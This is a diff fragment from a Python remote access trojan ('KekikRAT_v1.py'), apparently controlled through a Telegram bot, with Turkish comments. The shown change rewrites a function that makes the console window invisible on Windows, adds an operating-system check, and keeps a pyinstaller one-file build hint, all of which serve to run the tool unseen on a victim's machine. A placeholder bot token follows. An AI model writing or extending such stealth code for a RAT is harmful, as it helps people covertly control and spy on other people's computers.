@@ -22,12 +22,17 @@ import telebot              # Esas oğlanımız TeleBot
 ####################################################################################
 
 #Hadi Başlayalım..
-def WindowsTerminaliGizle(): # Windows'da betiği çalıştırdıktan sonra terminalin görünmez olması için fonksiyonumuz
-    import win32console, win32gui
-    Terminal = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(Terminal, 0)
+########################################################################################################################
+def WindowsTerminaliGizle():                        # WindowsTerminaliGizle adında bir fonksiyon oluşturduk
+    if isletim_sistemi == "Windows":                # Eğer İşletim Sistemi "Windows" ise
+        import win32console, win32gui               # Gerekli Modüller
+        terminal = win32console.GetConsoleWindow()  # Terminal adlı değişken
+        win32gui.ShowWindow(terminal, 0)            # Görünmez yap
+    else:                                           # Eğer İşletim Sistemi "Windows" değilse
+        pass                                        # Boşver :)
 #WindowsTerminaliGizle() # Eğer Windows'da Terminalin gizlenmesini istiyosanız aktifleştirin
-# -- pyinstaller --onefile KekikRAT_v1.py --
+                         # -- pyinstaller --onefile KekikRAT_v1.py --
+########################################################################################################################
 
 # / Telegram Bağlantısı ################################################
 bot_token = "XXXX:XXXX"                                # Bot Token
